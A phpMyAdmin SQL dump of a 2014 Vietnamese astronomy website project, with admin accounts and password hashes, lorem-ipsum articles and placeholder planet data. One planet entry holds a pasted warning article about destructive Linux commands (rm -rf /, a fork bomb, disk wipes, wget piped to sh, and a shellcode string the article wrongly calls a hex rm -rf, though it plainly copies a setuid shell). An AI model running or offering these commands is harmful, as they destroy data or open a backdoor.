-- phpMyAdmin SQL Dump
-- version 4.1.12
-- http://www.phpmyadmin.net
--
-- Host: localhost:3306
-- Generation Time: Dec 05, 2014 at 10:11 PM
-- Server version: 5.5.34
-- PHP Version: 5.5.10

SET SQL_MODE = "NO_AUTO_VALUE_ON_ZERO";
SET time_zone = "+00:00";


/*!40101 SET @OLD_CHARACTER_SET_CLIENT=@@CHARACTER_SET_CLIENT */;
/*!40101 SET @OLD_CHARACTER_SET_RESULTS=@@CHARACTER_SET_RESULTS */;
/*!40101 SET @OLD_COLLATION_CONNECTION=@@COLLATION_CONNECTION */;
/*!40101 SET NAMES utf8 */;

--
-- Database: `fit_aiw_2014`
--

-- --------------------------------------------------------

--
-- Table structure for table `active_admin_comments`
--

CREATE TABLE `active_admin_comments` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `namespace` varchar(255) COLLATE utf8_unicode_ci DEFAULT NULL,
  `body` text COLLATE utf8_unicode_ci,
  `resource_id` varchar(255) COLLATE utf8_unicode_ci NOT NULL,
  `resource_type` varchar(255) COLLATE utf8_unicode_ci NOT NULL,
  `author_id` int(11) DEFAULT NULL,
  `author_type` varchar(255) COLLATE utf8_unicode_ci DEFAULT NULL,
  `created_at` datetime DEFAULT NULL,
  `updated_at` datetime DEFAULT NULL,
  PRIMARY KEY (`id`),
  KEY `index_active_admin_comments_on_namespace` (`namespace`),
  KEY `index_active_admin_comments_on_author_type_and_author_id` (`author_type`,`author_id`),
  KEY `index_active_admin_comments_on_resource_type_and_resource_id` (`resource_type`,`resource_id`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8 COLLATE=utf8_unicode_ci AUTO_INCREMENT=1 ;

-- --------------------------------------------------------

--
-- Table structure for table `admin_users`
--

CREATE TABLE `admin_users` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `email` varchar(255) COLLATE utf8_unicode_ci NOT NULL DEFAULT '',
  `encrypted_password` varchar(255) COLLATE utf8_unicode_ci NOT NULL DEFAULT '',
  `reset_password_token` varchar(255) COLLATE utf8_unicode_ci DEFAULT NULL,
  `reset_password_sent_at` datetime DEFAULT NULL,
  `remember_created_at` datetime DEFAULT NULL,
  `sign_in_count` int(11) NOT NULL DEFAULT '0',
  `current_sign_in_at` datetime DEFAULT NULL,
  `last_sign_in_at` datetime DEFAULT NULL,
  `current_sign_in_ip` varchar(255) COLLATE utf8_unicode_ci DEFAULT NULL,
  `last_sign_in_ip` varchar(255) COLLATE utf8_unicode_ci DEFAULT NULL,
  `created_at` datetime DEFAULT NULL,
  `updated_at` datetime DEFAULT NULL,
  `username` varchar(255) COLLATE utf8_unicode_ci DEFAULT NULL,
  `display_name` varchar(255) COLLATE utf8_unicode_ci DEFAULT NULL,
  PRIMARY KEY (`id`),
  UNIQUE KEY `index_admin_users_on_email` (`email`),
  UNIQUE KEY `index_admin_users_on_reset_password_token` (`reset_password_token`)
) ENGINE=InnoDB  DEFAULT CHARSET=utf8 COLLATE=utf8_unicode_ci AUTO_INCREMENT=3 ;

--
-- Dumping data for table `admin_users`
--

INSERT INTO `admin_users` (`id`, `email`, `encrypted_password`, `reset_password_token`, `reset_password_sent_at`, `remember_created_at`, `sign_in_count`, `current_sign_in_at`, `last_sign_in_at`, `current_sign_in_ip`, `last_sign_in_ip`, `created_at`, `updated_at`, `username`, `display_name`) VALUES
(1, 'admin@example.com', '$2a$10$N4MB9vhcoCYa6y3ylxWdWO38sP1J7V.WurYbamQcRcTDKYl5MHa6W', NULL, NULL, NULL, 14, '2014-11-26 14:21:48', '2014-11-26 14:15:11', '127.0.0.1', '127.0.0.1', '2014-11-18 17:57:12', '2014-11-26 14:21:56', 'admin', 'Admin'),
(2, 'thinhbg@haintheme.com', '$2a$10$x5pS5CUnVXVdnwCNkfNQh.3x82zGVZo1.pW0BZLAL5Tmbt49q83cu', NULL, NULL, '2014-11-27 14:18:19', 10, '2014-12-02 17:14:52', '2014-12-02 17:03:27', '127.0.0.1', '127.0.0.1', '2014-11-21 06:59:29', '2014-12-02 17:14:52', 'buigiathinh', 'Thinh Bui');

-- --------------------------------------------------------

--
-- Table structure for table `articles`
--

CREATE TABLE `articles` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `title` varchar(255) COLLATE utf8_unicode_ci DEFAULT NULL,
  `feature_image` varchar(255) COLLATE utf8_unicode_ci DEFAULT NULL,
  `brief` varchar(255) COLLATE utf8_unicode_ci DEFAULT NULL,
  `admin_user_id` int(11) DEFAULT NULL,
  `content` text COLLATE utf8_unicode_ci,
  `created_at` datetime DEFAULT NULL,
  `updated_at` datetime DEFAULT NULL,
  PRIMARY KEY (`id`)
) ENGINE=InnoDB  DEFAULT CHARSET=utf8 COLLATE=utf8_unicode_ci AUTO_INCREMENT=5 ;

--
-- Dumping data for table `articles`
--

INSERT INTO `articles` (`id`, `title`, `feature_image`, `brief`, `admin_user_id`, `content`, `created_at`, `updated_at`) VALUES
(1, 'Sắp tận thế', 'http://localhost/www/aiw2014_astronomy/public/images/blog-1.jpg', 'Trái đất sắp đến ngày tận thế', 2, '<h1><big>Lorem ipsum dolor sit amet, <strong>consectetur</strong> adipisicing elit, sed do eiusmod tempor incididunt ut labore et dolore magna aliqua. Ut enim ad minim veniam quis nostrud exercitation ullamco laboris nisi ut aliquip ex ea commodo consequat. Duis aute irure dolor in reprehenderit in voluptate velit esse cillum dolore eu fugiat nulla pariatur. Excepteur sint occaecat cupidatat non proident, sunt in culpa qui officia deserunt mollit anim id est laborum.</big></h1>\r\n\r\n<p>Lorem ipsum dolor sit amet, consectetur adipisicing elit, sed do eiusmod tempor incididunt ut labore et dolore magna aliqua. Ut enim ad minim veniam quis nostrud exercitation ullamco laboris nisi ut aliquip ex ea commodo consequat. Duis aute irure dolor in reprehenderit in voluptate velit esse cillum dolore eu fugiat nulla pariatur. Excepteur sint occaecat cupidatat non proident, sunt in culpa qui officia deserunt mollit anim id est laborum.</p>\r\n\r\n<p>Lorem ipsum dolor sit amet, consectetur adipisicing elit, sed do eiusmod tempor incididunt ut labore et dolore magna aliqua. Ut enim ad minim veniam quis nostrud exercitation ullamco laboris nisi ut aliquip ex ea commodo consequat. Duis aute irure dolor in reprehenderit in voluptate velit esse cillum dolore eu fugiat nulla pariatur. Excepteur sint occaecat cupidatat non proident, sunt in culpa qui officia deserunt mollit anim id est laborum.</p>\r\n\r\n<p>Lorem ipsum dolor sit amet, consectetur adipisicing elit, sed do eiusmod tempor incididunt ut labore et dolore magna aliqua. Ut enim ad minim veniam quis nostrud exercitation ullamco laboris nisi ut aliquip ex ea commodo consequat. Duis aute irure dolor in reprehenderit in voluptate velit esse cillum dolore eu fugiat nulla pariatur. Excepteur sint occaecat cupidatat non proident, sunt in culpa qui officia deserunt mollit anim id est laborum.</p>\r\n', '2014-11-28 03:28:49', '2014-11-30 10:41:44'),
(2, 'Còn lâu mới tận thế', 'http://localhost/www/aiw2014_astronomy/public/images/cute-planets-funny-hd-wallpaper-1920x1200-4123.jpg', 'Lorem ipsum dolor sit amet, consectetur adipisicing elit, sed do eiusmod tempor incididunt ut labore et dolore magna aliqua. Ut enim ad minim veniam, quis nostrud exercitation ullamco laboris nisi ut aliquip ex ea commodo consequat. Duis aute irure dolor ', 1, '<p><strong>Lorem ipsum dolor sit amet, consectetur adipisicing elit, sed do eiusmod tempor incididunt ut labore et dolore magna aliqua. Ut enim ad minim veniam, quis nostrud exercitation ullamco laboris nisi ut aliquip ex ea commodo consequat. Duis aute irure dolor in reprehenderit in voluptate velit esse cillum dolore eu fugiat nulla pariatur. Excepteur sint occaecat cupidatat non proident, sunt in culpa qui officia deserunt mollit anim id est laborum.</strong></p>\r\n\r\n<p>Lorem ipsum dolor sit amet, consectetur adipisicing elit, sed do eiusmod tempor incididunt ut labore et dolore magna aliqua. Ut enim ad minim veniam, quis nostrud exercitation ullamco laboris nisi ut aliquip ex ea commodo consequat. Duis aute irure dolor in reprehenderit in voluptate velit esse cillum dolore eu fugiat nulla pariatur. Excepteur sint occaecat cupidatat non proident, sunt in culpa qui officia deserunt mollit anim id est laborum.</p>\r\n\r\n<p>Lorem ipsum dolor sit amet, consectetur adipisicing elit, sed do eiusmod tempor incididunt ut labore et dolore magna aliqua. Ut enim ad minim veniam, quis nostrud exercitation ullamco laboris nisi ut aliquip ex ea commodo consequat. Duis aute irure dolor in reprehenderit in voluptate velit esse cillum dolore eu fugiat nulla pariatur. Excepteur sint occaecat cupidatat non proident, sunt in culpa qui officia deserunt mollit anim id est laborum.</p>\r\n', '2014-11-29 15:12:49', '2014-11-30 10:41:33'),
(3, 'Hola Pita', 'http://localhost/www/aiw2014_astronomy/public/images/espuma-planet_1x.png', 'Lorem ipsum dolor sit amet, consectetur adipisicing elit, sed do eiusmod tempor incididunt ut labore et dolore magna aliqua. Ut enim ad minim veniam, quis nostrud exercitation ullamco laboris nisi ut aliquip ex ea commodo consequat. Duis aute irure dolor ', 2, '<p><strong>Lorem ipsum dolor sit amet, consectetur adipisicing elit, sed do eiusmod tempor incididunt ut labore et dolore magna aliqua. Ut enim ad minim veniam, quis nostrud exercitation ullamco laboris nisi ut aliquip ex ea commodo consequat.</strong></p>\r\n\r\n<p>Lorem ipsum dolor sit amet, consectetur adipisicing elit, sed do eiusmod tempor incididunt ut labore et dolore magna aliqua. Ut enim ad minim veniam, quis nostrud exercitation ullamco laboris nisi ut aliquip ex ea commodo consequat.</p>\r\n\r\n<p>Lorem ipsum dolor sit amet, consectetur adipisicing elit, sed do eiusmod tempor incididunt ut labore et dolore magna aliqua. Ut enim ad minim veniam, quis nostrud exercitation ullamco laboris nisi ut aliquip ex ea commodo consequat.</p>\r\n', '2014-11-30 03:24:24', '2014-11-30 10:41:11'),
(4, 'Bai viet linh tinh', 'http://localhost/resource/images/people/team1/mem-1.jpg', 'Lorem ipsum dolor sit amet, consectetur adipisicing elit, sed do eiusmod tempor incididunt ut labore et dolore magna aliqua. Ut enim ad minim veniam, quis nostrud exercitation ullamco laboris nisi ut aliquip ex ea commodo consequat. Duis aute irure dolor ', 2, '<p><strong>Lorem ipsum dolor sit amet, consectetur adipisicing elit, sed do eiusmod tempor incididunt ut labore et dolore magna aliqua. Ut enim ad minim veniam, quis nostrud exercitation ullamco laboris nisi ut aliquip ex ea commodo consequat. Duis aute irure dolor in reprehenderit in voluptate velit esse cillum dolore eu fugiat nulla pariatur. Excepteur sint occaecat cupidatat non proident, sunt in culpa qui officia deserunt mollit anim id est laborum.</strong></p>\r\n\r\n<p><em>Lorem ipsum dolor sit amet, consectetur adipisicing elit, sed do eiusmod tempor incididunt ut labore et dolore magna aliqua. Ut enim ad minim veniam, quis nostrud exercitation ullamco laboris nisi ut aliquip ex ea commodo consequat. Duis aute irure dolor in reprehenderit in voluptate velit esse cillum dolore eu fugiat nulla pariatur. Excepteur sint occaecat cupidatat non proident, sunt in culpa qui officia deserunt mollit anim id est laborum.</em></p>\r\n\r\n<p>Lorem ipsum dolor sit amet, consectetur adipisicing elit, sed do eiusmod tempor incididunt ut labore et dolore magna aliqua. Ut enim ad minim veniam, quis nostrud exercitation ullamco laboris nisi ut aliquip ex ea commodo consequat. Duis aute irure dolor in reprehenderit in voluptate velit esse cillum dolore eu fugiat nulla pariatur. Excepteur sint occaecat cupidatat non proident, sunt in culpa qui officia deserunt mollit anim id est laborum.</p>\r\n', '2014-12-02 06:42:22', '2014-12-02 06:42:22');

-- --------------------------------------------------------

--
-- Table structure for table `ckeditor_assets`
--

CREATE TABLE `ckeditor_assets` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `data_file_name` varchar(255) COLLATE utf8_unicode_ci NOT NULL,
  `data_content_type` varchar(255) COLLATE utf8_unicode_ci DEFAULT NULL,
  `data_file_size` int(11) DEFAULT NULL,
  `assetable_id` int(11) DEFAULT NULL,
  `assetable_type` varchar(30) COLLATE utf8_unicode_ci DEFAULT NULL,
  `type` varchar(30) COLLATE utf8_unicode_ci DEFAULT NULL,
  `width` int(11) DEFAULT NULL,
  `height` int(11) DEFAULT NULL,
  `created_at` datetime DEFAULT NULL,
  `updated_at` datetime DEFAULT NULL,
  PRIMARY KEY (`id`),
  KEY `idx_ckeditor_assetable_type` (`assetable_type`,`type`,`assetable_id`),
  KEY `idx_ckeditor_assetable` (`assetable_type`,`assetable_id`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8 COLLATE=utf8_unicode_ci AUTO_INCREMENT=1 ;

-- --------------------------------------------------------

--
-- Table structure for table `planets`
--

CREATE TABLE `planets` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `name` varchar(255) COLLATE utf8_unicode_ci DEFAULT NULL,
  `mass` varchar(255) COLLATE utf8_unicode_ci DEFAULT NULL,
  `diameter` varchar(255) COLLATE utf8_unicode_ci DEFAULT NULL,
  `density` varchar(255) COLLATE utf8_unicode_ci DEFAULT NULL,
  `gravity` varchar(255) COLLATE utf8_unicode_ci DEFAULT NULL,
  `escape_velocity` varchar(255) COLLATE utf8_unicode_ci DEFAULT NULL,
  `rotation_period` varchar(255) COLLATE utf8_unicode_ci DEFAULT NULL,
  `day_lenght` varchar(255) COLLATE utf8_unicode_ci DEFAULT NULL,
  `distance_from_sun` varchar(255) COLLATE utf8_unicode_ci DEFAULT NULL,
  `perihelion` varchar(255) COLLATE utf8_unicode_ci DEFAULT NULL,
  `aphelion` varchar(255) COLLATE utf8_unicode_ci DEFAULT NULL,
  `orbital_period` varchar(255) COLLATE utf8_unicode_ci DEFAULT NULL,
  `orbital_velocity` varchar(255) COLLATE utf8_unicode_ci DEFAULT NULL,
  `orbital_Inclination` varchar(255) COLLATE utf8_unicode_ci DEFAULT NULL,
  `axis_inclination` varchar(255) COLLATE utf8_unicode_ci DEFAULT NULL,
  `weight` varchar(255) COLLATE utf8_unicode_ci DEFAULT NULL,
  `temperature` varchar(255) COLLATE utf8_unicode_ci DEFAULT NULL,
  `surface_pressure` varchar(255) COLLATE utf8_unicode_ci DEFAULT NULL,
  `atmospheric_composition` varchar(255) COLLATE utf8_unicode_ci DEFAULT NULL,
  `satellite` varchar(255) COLLATE utf8_unicode_ci DEFAULT NULL,
  `ring` varchar(255) COLLATE utf8_unicode_ci DEFAULT NULL,
  `created_at` datetime DEFAULT NULL,
  `updated_at` datetime DEFAULT NULL,
  `avatar` varchar(255) COLLATE utf8_unicode_ci DEFAULT NULL,
  `detail` mediumtext COLLATE utf8_unicode_ci,
  PRIMARY KEY (`id`)
) ENGINE=InnoDB  DEFAULT CHARSET=utf8 COLLATE=utf8_unicode_ci AUTO_INCREMENT=5 ;

--
-- Dumping data for table `planets`
--

INSERT INTO `planets` (`id`, `name`, `mass`, `diameter`, `density`, `gravity`, `escape_velocity`, `rotation_period`, `day_lenght`, `distance_from_sun`, `perihelion`, `aphelion`, `orbital_period`, `orbital_velocity`, `orbital_Inclination`, `axis_inclination`, `weight`, `temperature`, `surface_pressure`, `atmospheric_composition`, `satellite`, `ring`, `created_at`, `updated_at`, `avatar`, `detail`) VALUES
(1, 'Trái đất', '12', '23', '12', '0', '7', '3', '9', '0', '76', '9', '8', '7', '6', '6', '9', '0', '6', '6', '9', 'Không', '2014-11-19 14:47:05', '2014-11-28 00:24:14', 'http://localhost/www/aiw2014_astronomy/public/images/planet-5.png', '<div>Cũng giống như Command Prompt của Windows, linux cũng c&oacute; một cửa sổ d&ograve;ng lệnh được t&iacute;ch hợp song song với giao diện đồ họa, đ&oacute; l&agrave; Terminal. Tuy nhi&ecirc;n, sức mạnh của Terminal lớn hơn Command Prompt rất nhiều. Ch&iacute;nh v&igrave; thế, một d&ograve;ng lệnh cũng c&oacute; thể khiến m&aacute;y t&iacute;nh của bạn lao đao, nhẹ th&igrave; hỏng hệ thống, nặng th&igrave; c&oacute; thể mất hết dữ liệu. Những d&ograve;ng lệnh nguy hiểm n&agrave;y thường được d&ugrave;ng để chơi xỏ những người mới l&agrave;m quen với Linux.</div>\r\n\r\n<div>&nbsp;</div>\r\n\r\n<div>Việc hiểu biết hơn về ch&uacute;ng kh&ocirc;ng chỉ gi&uacute;p bạn n&acirc;ng cao về kiến thức sử dụng Linux m&agrave; c&ograve;n gi&uacute;p bạn tự bảo về m&aacute;y t&iacute;nh của m&igrave;nh, tr&aacute;nh những tai nạn đ&aacute;ng tiếc. Bạn cần ch&uacute; &yacute; rằng b&agrave;i viết sẽ gi&uacute;p bạn c&oacute; những kh&aacute;i niệm cơ bản chứ kh&ocirc;ng thể bao qu&aacute;t hết to&agrave;n bộ, v&igrave; c&aacute;c d&ograve;ng lệnh c&oacute; thể được người d&ugrave;ng biến thể đi.</div>\r\n\r\n<div>&nbsp;</div>\r\n\r\n<div><a class="lightbox-photo" href="http://cdn.howtogeek.com/wp-content/uploads/2012/09/image246.png" style="color: #0088cc;"><img alt="" class="aligncenter" src="http://cdn.howtogeek.com/wp-content/uploads/2012/09/image246.png" /></a></div>\r\n\r\n<div>&nbsp;</div>\r\n\r\n<div><strong><span style="color:#ff6600; font-size:large">rm -rf / &ndash; X&oacute;a mọi thứ</span></strong></div>\r\n\r\n<div><code>rm -rf</code></div>\r\n\r\n<div>&nbsp;</div>\r\n\r\n<div>Lệnh n&agrave;y giống như một th&ugrave;ng r&aacute;c đang đ&oacute;i, n&oacute; sẽ x&oacute;a tất cả mọi thứ c&oacute; thể x&oacute;a từ dữ liệu tr&ecirc;n ổ cứng đến dữ liệu tr&ecirc;n c&aacute;c thiết bị cắm ngo&agrave;i. Linux sẽ thực tu&acirc;n lệnh n&agrave;y một c&aacute;ch vui vẻ, x&oacute;a m&agrave; kh&ocirc;ng cảnh b&aacute;o bạn một c&acirc;u.</div>\r\n\r\n<div>&nbsp;</div>\r\n\r\n<div><strong>Giải th&iacute;ch:</strong></div>\r\n\r\n<div><strong>rm&nbsp;</strong>: x&oacute;a file.</div>\r\n\r\n<div><strong>-rf&nbsp;</strong>: x&oacute;a theo h&igrave;nh thức đệ quy, tức l&agrave; sẽ x&oacute;a hết file trong folder, sau đ&oacute; sẽ x&oacute;a cả folder đấy lu&ocirc;n. Thuộc t&iacute;nh n&agrave;y sẽ x&oacute;a m&agrave; kh&ocirc;ng cảnh b&aacute;o người d&ugrave;ng.</div>\r\n\r\n<div><strong>/</strong>&nbsp;: (root) bắt đầu x&oacute;a từ root, đồng nghĩa tất cả c&aacute;c thiết bị đang được mount sẽ bị đụng đến.</div>\r\n\r\n<div>&nbsp;</div>\r\n\r\n<div><strong>Một số biến thể kh&aacute;c:</strong></div>\r\n\r\n<div><strong>rm &ndash;rf ~&nbsp;</strong>: x&oacute;a dữ liệu của thư mục home</div>\r\n\r\n<div><strong>rm -rf .*&nbsp;</strong>: x&oacute;a c&aacute;c thiết đặt người d&ugrave;ng</div>\r\n\r\n<div>&nbsp;</div>\r\n\r\n<div><strong>B&agrave;i học r&uacute;t ra</strong>: cảnh gi&aacute;c với&nbsp;<strong>rm -rf</strong></div>\r\n\r\n<div>&nbsp;</div>\r\n\r\n<div><strong><span style="color:#ff6600; font-size:large">rm -rf / - Phi&ecirc;n bản ngụy trang</span></strong></div>\r\n\r\n<div>Đ&acirc;y l&agrave; một đoạn lệnh rất phổ biến tr&ecirc;n mạng:</div>\r\n\r\n<div><code>char esp[] __attribute__ ((section(&ldquo;.text&rdquo;))) /* e.s.p release */ = &ldquo;\\xeb\\x3e\\x5b\\x31\\xc0\\x50\\x54\\x5a\\x83\\xec\\x64\\x68&Prime; &ldquo;\\xff\\xff\\xff\\xff\\x68\\xdf\\xd0\\xdf\\xd9\\x68\\x8d\\x99&Prime; &ldquo;\\xdf\\x81\\x68\\x8d\\x92\\xdf\\xd2\\x54\\x5e\\xf7\\x16\\xf7&Prime; &ldquo;\\x56\\x04\\xf7\\x56\\x08\\xf7\\x56\\x0c\\x83\\xc4\\x74\\x56&Prime; &ldquo;\\x8d\\x73\\x08\\x56\\x53\\x54\\x59\\xb0\\x0b\\xcd\\x80\\x31&Prime; &ldquo;\\xc0\\x40\\xeb\\xf9\\xe8\\xbd\\xff\\xff\\xff\\x2f\\x62\\x69&Prime; &ldquo;\\x6e\\x2f\\x73\\x68\\x00\\x2d\\x63\\x00&Prime; &ldquo;cp -p /bin/sh /tmp/.beyond; chmod 4755 /tmp/.beyond;&rdquo;;</code></div>\r\n\r\n<div>Đ&acirc;y l&agrave; phi&ecirc;n bản hexa của&nbsp;<strong>rm -rf</strong>&nbsp;với chức năng tương tự.</div>\r\n\r\n<div>&nbsp;</div>\r\n\r\n<div><strong>B&agrave;i học r&uacute;t ra</strong>: Cảnh gi&aacute;c với những đoạn lệnh rối rắm, kh&oacute; hiểu.</div>\r\n\r\n<div>&nbsp;</div>\r\n\r\n<div><strong><span style="color:#ff6600; font-size:large">:(){ :|: &amp; };: &ndash; &quot;Bom cho&aacute;ng&quot;</span></strong></div>\r\n\r\n<div><code>:(){ :|: &amp; };:</code></div>\r\n\r\n<div>&nbsp;</div>\r\n\r\n<div>Tr&ocirc;ng c&oacute; vẻ đơn giản, thậm ch&iacute; vui mắt đ&uacute;ng kh&ocirc;ng n&agrave;o. Tuy nhi&ecirc;n n&oacute; lại chẳng đơn giản tẹo n&agrave;o. Đ&acirc;y l&agrave; h&agrave;m thực thi theo cấp số nh&acirc;n. N&oacute; sẽ tự nh&acirc;n đ&ocirc;i như tế b&agrave;o, tiếp tục thực thi v&agrave; tự nh&acirc;n đ&ocirc;i. Cứ như thế, t&agrave;i nguy&ecirc;n m&aacute;y t&iacute;nh của bạn (CPU, RAM) sẽ cạn kiệt v&agrave; m&aacute;y t&iacute;nh của bạn sẽ bị &quot;đơ&quot; nhanh ch&oacute;ng. Về bản chất, n&oacute; giống với tấn c&ocirc;ng từ chối dịch vụ (DDOS).</div>\r\n\r\n<div>&nbsp;</div>\r\n\r\n<div><a class="lightbox-photo" href="http://cdn.howtogeek.com/wp-content/uploads/2012/09/image247.png" style="color: #0088cc;"><img alt="" class="aligncenter" src="http://cdn.howtogeek.com/wp-content/uploads/2012/09/image247.png" /></a></div>\r\n\r\n<div>&nbsp;</div>\r\n\r\n<div><strong>B&agrave;i học r&uacute;t ra</strong>: H&agrave;m thực thi theo cấp số nh&acirc;n rất nguy hiểm cho d&ugrave; ch&uacute;ng rất ngắn. Đừng thấy ch&uacute;ng vui mắt m&agrave; thử nha.</div>\r\n\r\n<div>&nbsp;</div>\r\n\r\n<div><strong><span style="color:#ff6600; font-size:large">mkfs.ext4 /dev/sda1 &ndash; Định dạng (format) ph&acirc;n v&ugrave;ng.</span></strong></div>\r\n\r\n<div><code>mkfs.ext4 /dev/sda1</code></div>\r\n\r\n<div>&nbsp;</div>\r\n\r\n<div><strong>Giải th&iacute;ch:</strong></div>\r\n\r\n<div><strong>mkfs.ext4</strong>&nbsp;&ndash; Tạo ph&acirc;n v&ugrave;ng ext4</div>\r\n\r\n<div><strong>/dev/sda1</strong>&nbsp;&ndash; Chỉ định ph&acirc;n v&ugrave;ng đầu ti&ecirc;n của ổ cứng.</div>\r\n\r\n<div>&nbsp;</div>\r\n\r\n<div>Kết hợp lại, bạn sẽ c&oacute; đ&ograve;ng lệnh tương đương với format C:/ của Windows, dữ liệu tr&ecirc;n ph&acirc;n v&ugrave;ng đầu ti&ecirc;n sẽ bị x&oacute;a. D&ograve;ng lệnh n&agrave;y c&oacute; để bị biến thể, v&iacute; dụ mkfs.ext3 /dev/sdb2 (định dạng lại ph&acirc;n v&ugrave;ng thứ 2 của ổ cứng với định dạng ext3).</div>\r\n\r\n<div>&nbsp;</div>\r\n\r\n<div><strong>B&agrave;i học r&uacute;t ra</strong>: Cảnh gi&aacute;c với c&aacute;c lệnh đụng chạm tới ổ cứng (<strong>dev/sd</strong>)</div>\r\n\r\n<div>&nbsp;</div>\r\n\r\n<div><strong><span style="color:#ff6600; font-size:large">command &gt; /dev/sda &ndash; Ghi trực tiếp l&ecirc;n ổ cứng</span></strong></div>\r\n\r\n<div><code>command &gt; /dev/sda</code></div>\r\n\r\n<div>&nbsp;</div>\r\n\r\n<div>D&ograve;ng lệnh n&agrave;y sẽ được thực thi, gửi kết quả tới ổ cứng thứ nhất của m&aacute;y bạn, sau đ&oacute; ghi đ&egrave; kết quả của d&ograve;ng lệnh n&agrave;y l&ecirc;n file hệ thống, hệ thống của bạn sẽ bị pha hủy.</div>\r\n\r\n<div>&nbsp;</div>\r\n\r\n<div><strong>Giải th&iacute;ch:</strong></div>\r\n\r\n<div><strong>command</strong>&nbsp;&ndash; chạy 1 lệnh (bất cứ lệnh g&igrave;)</div>\r\n\r\n<div><strong>&gt;</strong>&nbsp;&ndash; Gửi kết quả tới địa chỉ chỉ định</div>\r\n\r\n<div><strong>/dev/sda</strong>&nbsp;&ndash; Địa chỉ ổ cứng đầu ti&ecirc;n</div>\r\n\r\n<div>&nbsp;</div>\r\n\r\n<div><strong>B&agrave;i học r&uacute;t ra</strong>: Giống như lệnh trước, cảnh gi&aacute;c với c&aacute;c lệnh đụng chạm tới ổ cứng (<strong>dev/sd</strong>).</div>\r\n\r\n<div>&nbsp;</div>\r\n\r\n<div><strong><span style="color:#ff6600; font-size:large">dd if=/dev/random of=/dev/sda &ndash; Ghi file ngẫu nhi&ecirc;n l&ecirc;n ổ cứng</span></strong></div>\r\n\r\n<div><code>dd if=/dev/random of=/dev/sda</code></div>\r\n\r\n<div>&nbsp;</div>\r\n\r\n<div>D&ograve;ng lệnh n&agrave;y cũng sẽ ghi đ&egrave; dữ liệu l&ecirc;n dữ liệu trong ổ cứng đầu ti&ecirc;n của m&aacute;y bạn.</div>\r\n\r\n<div>&nbsp;</div>\r\n\r\n<div><strong>Giải th&iacute;ch</strong></div>\r\n\r\n<div><strong>dd</strong>&nbsp;&ndash; Copy bậc thấp 1 file đến địa chỉ chỉ định</div>\r\n\r\n<div><strong>if=/dev/random</strong>&nbsp;&ndash; Dữ liệu được chọn để ghi, random sẽ chọn ngẫu nhi&ecirc;n dữ liệu.</div>\r\n\r\n<div><strong>of=/dev/sda</strong>&nbsp;- Địa điểm đ&iacute;ch để ghi.</div>\r\n\r\n<div>&nbsp;</div>\r\n\r\n<div><strong>B&agrave;i học r&uacute;t ra</strong>: Copy dữ liệu bằng lệnh&nbsp;<strong>dd</strong>&nbsp;sẽ rất nguy hiểm khi kết hợp với&nbsp;<strong>dev/random</strong></div>\r\n\r\n<div>&nbsp;</div>\r\n\r\n<div><a class="lightbox-photo" href="http://cdn.howtogeek.com/wp-content/uploads/2012/09/hard-drive-lights.jpg" style="color: #0088cc;"><img alt="" class="aligncenter" src="http://cdn.howtogeek.com/wp-content/uploads/2012/09/hard-drive-lights.jpg" /></a></div>\r\n\r\n<div>&nbsp;</div>\r\n\r\n<div><strong><span style="color:#ff6600; font-size:large">mv ~ /dev/null &ndash; Chuyển dữ liệu của thư mục Home v&agrave;o &quot;hố đen&quot;.</span></strong></div>\r\n\r\n<div><code>mv ~ /dev/null</code></div>\r\n\r\n<div>&nbsp;</div>\r\n\r\n<div>Nếu c&aacute;c bạn biết kh&aacute;i niệm null, chắc chắn c&aacute;c bạn sẽ nhận ra ngay /dev/null l&agrave; một địa chỉ nguy hiểm thế n&agrave;o. H&atilde;y tưởng tượng /dev/null l&agrave; một hố đen của Linux, việc chuyển dữ liệu v&agrave;o hố đen chả kh&aacute;c n&agrave;o bạn x&oacute;a vĩnh viễn ch&uacute;ng cả.</div>\r\n\r\n<div>&nbsp;</div>\r\n\r\n<div><strong>Giải th&iacute;ch:</strong></div>\r\n\r\n<div><strong>mv&nbsp;</strong>: di chuyển thư mục hoặc tệp tin</div>\r\n\r\n<div>~<strong>&nbsp;</strong>: thư mục Home</div>\r\n\r\n<div><strong>/dev/null&nbsp;</strong>: địa chỉ &quot;hố đen&quot;</div>\r\n\r\n<div>&nbsp;</div>\r\n\r\n<div>B&agrave;i học r&uacute;t ra: K&iacute; tự&nbsp;<strong>~</strong>&nbsp;địa diện cho thư mục Home, mọi thao t&aacute;c v&agrave;o k&yacute; thự n&agrave;y sẽ t&aacute;c động đến dữ liệu nằm trong đấy.&nbsp;<strong>/dev/null</strong>&nbsp;l&agrave; một địa chỉ nguy hiểm, chuyển dữ liệu v&agrave;o đ&oacute; đồng nghĩa với việc bạn x&oacute;a ch&uacute;ng.</div>\r\n\r\n<div>&nbsp;</div>\r\n\r\n<div><strong><span style="color:#ff6600; font-size:large">wget http://example.com/something -O &ndash; | sh &ndash; Tải file script v&agrave; tự động thực thi</span></strong></div>\r\n\r\n<div><code>wget http://example.com/something -O &ndash; | sh </code></div>\r\n\r\n<div>&nbsp;</div>\r\n\r\n<div>D&ograve;ng lệnh tr&ecirc;n sẽ tải một file chứa đoạn m&atilde; từ url chỉ định sau đ&oacute; tự động thực thi. H&agrave;nh động n&agrave;y sẽ rất nguy hiểm v&igrave; bạn sẽ kh&ocirc;ng thể biết trước đoạn m&atilde; sẽ l&agrave;m g&igrave; chiếc m&aacute;y t&iacute;nh y&ecirc;u qu&yacute; của bạn. V&igrave; thế, tuyệt đối kh&ocirc;ng được chạy nếu trang web đưa cho bạn d&ograve;ng lệnh n&agrave;y kh&ocirc;ng tin cậy.</div>\r\n\r\n<div>&nbsp;</div>\r\n\r\n<div><strong>Giải th&iacute;ch:</strong></div>\r\n\r\n<div><strong>wget&nbsp;</strong>: Tải tệp tin</div>\r\n\r\n<div><strong>http://example.com/something</strong>&nbsp;: địa chỉ được chỉ định</div>\r\n\r\n<div><strong>|</strong>&nbsp;: gửi tệp đấy đến một c&acirc;u lệnh mới.</div>\r\n\r\n<div><strong>sh</strong>&nbsp;: Gửi file đến đến lệnh sh, lệnh n&agrave;y sẽ thực thi file đ&oacute; nếu n&oacute; l&agrave; một đoạn 